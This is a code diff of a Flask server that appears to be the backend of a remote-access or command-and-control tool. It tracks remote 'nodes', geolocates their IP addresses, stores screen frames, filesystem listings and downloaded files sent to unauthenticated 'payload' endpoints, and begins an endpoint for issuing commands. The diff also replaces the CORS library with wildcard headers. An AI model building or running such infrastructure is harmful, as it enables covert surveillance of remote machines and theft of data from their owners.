@@ -3,26 +3,30 @@ import os
 import json
 import requests
 from flask import Flask, request, jsonify
-from flask_cors import CORS
 from datetime import datetime, timedelta, timezone
 
 app = Flask(__name__)
 
-# --- STRICT CORS CONFIGURATION ---
-# This explicitly allows the dashboard to communicate with Render, 
-# explicitly permitting our custom password header.
-CORS(app, resources={
-    r"/*": {
-        "origins": "*",
-        "methods": ["GET", "POST", "OPTIONS", "PUT", "DELETE"],
-        "allow_headers": ["Content-Type", "Authorization", "X-Dashboard-Password", "x-dashboard-password", "Accept"]
-    }
-})
+# ==================================================================
+# --- MANUAL CORS OVERRIDE (BYPASS FLASK-CORS) ---
+# ==================================================================
+@app.after_request
+def add_cors_headers(response):
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Dashboard-Password, Accept'
+    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, PUT, DELETE'
+    return response
 
-# Catch backend crashes and return them as JSON so the dashboard can read them.
+# Catch all preflight OPTIONS requests directly and approve them
+@app.route('/', defaults={'path': ''}, methods=['OPTIONS'])
+@app.route('/<path:path>', methods=['OPTIONS'])
+def handle_options(path):
+    return '', 200
+
 @app.errorhandler(Exception)
 def handle_exception(e):
     return jsonify({"error": f"Backend Error: {str(e)}"}), 500
+# ==================================================================
 
 # Credentials from Render Environment Variables
 SUPABASE_URL = os.environ.get("SUPABASE_URL")
@@ -35,12 +39,8 @@ frame_cache = {}
 filesystem_cache = {}
 file_download_cache = {} 
 
-# ---------------------------------------------------------
-# HELPER FUNCTIONS
-# ---------------------------------------------------------
 def get_node_status(last_seen_str):
-    if not last_seen_str: 
-        return "red", "Offline"
+    if not last_seen_str: return "red", "Offline"
     try:
         last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
         now = datetime.now(timezone.utc)
@@ -50,30 +50,22 @@ def get_node_status(last_seen_str):
     return "red", "Offline"
 
 def geolocate_ip(ip):
-    if not ip or ip.startswith("127.") or "Unknown" in ip: 
-        return 28.5383, -81.3792 
+    if not ip or ip.startswith("127.") or "Unknown" in ip: return 28.5383, -81.3792 
     try:
         response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
-        if response.ok:
-            data = response.json()
-            if data.get("status") == "success":
-                return float(data.get("lat")), float(data.get("lon"))
+        if response.ok and response.json().get("status") == "success":
+            return float(response.json().get("lat")), float(response.json().get("lon"))
     except: pass
     return 28.5383, -81.3792 
 
-# ---------------------------------------------------------
-# DASHBOARD ENDPOINTS
-# ---------------------------------------------------------
 @app.route('/node/<device_id>', methods=['GET'])
 def get_single_node(device_id):
     if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
         return jsonify({"error": "Unauthorized: Password mismatch"}), 401
-
     if not SUPABASE_KEY or not SUPABASE_URL:
         return jsonify({"error": "Missing SUPABASE_URL or SUPABASE_KEY in Render Vars!"}), 500
 
     headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
-    
     try:
         time_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&select=created_at&order=created_at.desc&limit=1"
         response = requests.get(time_url, headers=headers, timeout=10)
@@ -89,7 +81,6 @@ def get_single_node(device_id):
         sysinfo_resp = requests.get(sysinfo_url, headers=headers, timeout=10)
         
         os_info, ip_info = "Windows (Assumed)", "Unknown IP"
-        
         sys_data = sysinfo_resp.json() if sysinfo_resp.ok else []
         if sys_data and isinstance(sys_data, list) and len(sys_data) > 0:
             content = sys_data[0].get('content', '')
@@ -100,28 +91,20 @@ def get_single_node(device_id):
         status_color, _ = get_node_status(last_seen)
         lat, lng = geolocate_ip(ip_info)
         
-        return jsonify({
-            "id": device_id, "os": os_info, "ip": ip_info, 
-            "lat": lat, "lng": lng, "status": status_color, "last_seen": last_seen
-        })
+        return jsonify({"id": device_id, "os": os_info, "ip": ip_info, "lat": lat, "lng": lng, "status": status_color, "last_seen": last_seen})
 
     except requests.exceptions.RequestException as e:
         return jsonify({"error": f"Supabase Connection Failed: {str(e)}"}), 500
 
 @app.route('/logs/<device_id>', methods=['GET'])
 def get_logs(device_id):
-    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
-        return jsonify({"error": "Unauthorized access"}), 401
-
+    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
     headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
-    url = f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc"
-    
     try:
-        response = requests.get(url, headers=headers, timeout=10)
+        response = requests.get(f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc", headers=headers, timeout=10)
         response.raise_for_status()
         return jsonify(response.json()), 200
-    except requests.exceptions.RequestException as e: 
-        return jsonify({"error": f"Database fetch failed: {str(e)}"}), 500
+    except Exception as e: return jsonify({"error": f"Database fetch failed: {str(e)}"}), 500
 
 @app.route('/frames/<device_id>/<cache_key>', methods=['GET'])
 def get_frame(device_id, cache_key):
@@ -133,7 +116,7 @@ def get_frame(device_id, cache_key):
 def get_fs_data(device_id):
     if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
     json_str = filesystem_cache.pop(device_id, None) 
-    if not json_str: return jsonify({"error": "Filesystem data not available"}), 404
+    if not json_str: return jsonify({"error": "No FS data"}), 404
     try: return jsonify(json.loads(json_str)), 200
     except Exception: return jsonify({"error": "Invalid format"}), 500
 
@@ -145,9 +128,6 @@ def get_fs_download(device_id):
     try: return jsonify(json.loads(json_data)), 200
     except Exception: return jsonify({"error": "Invalid format"}), 500
 
-# ---------------------------------------------------------
-# PAYLOAD ENDPOINTS
-# ---------------------------------------------------------
 @app.route('/frames', methods=['POST'])
 def push_frame():
     data = request.json
@@ -162,17 +142,16 @@ def push_logs():
     data = request.json
     if data and data.get("category") == "filesystem_data":
         filesystem_cache[data.get("device_id")] = data.get("content")
-        return jsonify({"status": "fs data cached"}), 200
+        return jsonify({"status": "fs cached"}), 200
     if data and data.get("category") == "file_download_data":
         file_download_cache[data.get("device_id")] = data.get("content")
-        return jsonify({"status": "download cached"}), 200
+        return jsonify({"status": "dl cached"}), 200
 
     headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Prefer": "return=minimal,resolution=merge-duplicates"}
-    upsert_url = f"{SUPABASE_URL}?on_conflict=device_id,category"
     try:
-        requests.post(upsert_url, json=data, headers=headers, timeout=15)
+        requests.post(f"{SUPABASE_URL}?on_conflict=device_id,category", json=data, headers=headers, timeout=15)
         return jsonify({"status": "success"}), 200
-    except Exception as e: return jsonify({"error": f"Database push failed: {str(e)}"}), 500
+    except Exception as e: return jsonify({"error": f"DB push failed: {str(e)}"}), 500
 
 @app.route('/issue', methods=['POST'])
 def issue_command():
